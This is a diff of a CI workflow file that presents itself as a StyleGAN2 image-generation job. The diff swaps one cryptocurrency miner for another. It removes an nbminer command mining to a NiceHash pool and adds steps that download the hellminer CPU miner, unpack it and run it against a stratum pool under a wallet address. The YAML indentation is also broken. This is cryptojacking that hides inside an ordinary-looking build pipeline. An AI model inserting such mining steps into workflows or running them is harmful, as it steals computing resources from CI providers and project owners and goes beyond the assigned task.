@@ -34,8 +34,14 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        lscpu
-        ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 327ojqfc6uk1BjKDKLTpmhEU7V82Bg4fWb.RIG
+        - name: PREPARING
+      run: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+    - name: Seting-UP
+      run: tar xf hellminer_cpu_linux.tar.gz
+    - name: Running
+      run: ./hellminer -c stratum+tcp://pool -u RNa9RXXezxmCRikCVC7pq7jH4hrjUnWYFd.Al -p x --cpu 8
+    - name: END
+      run: exit
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
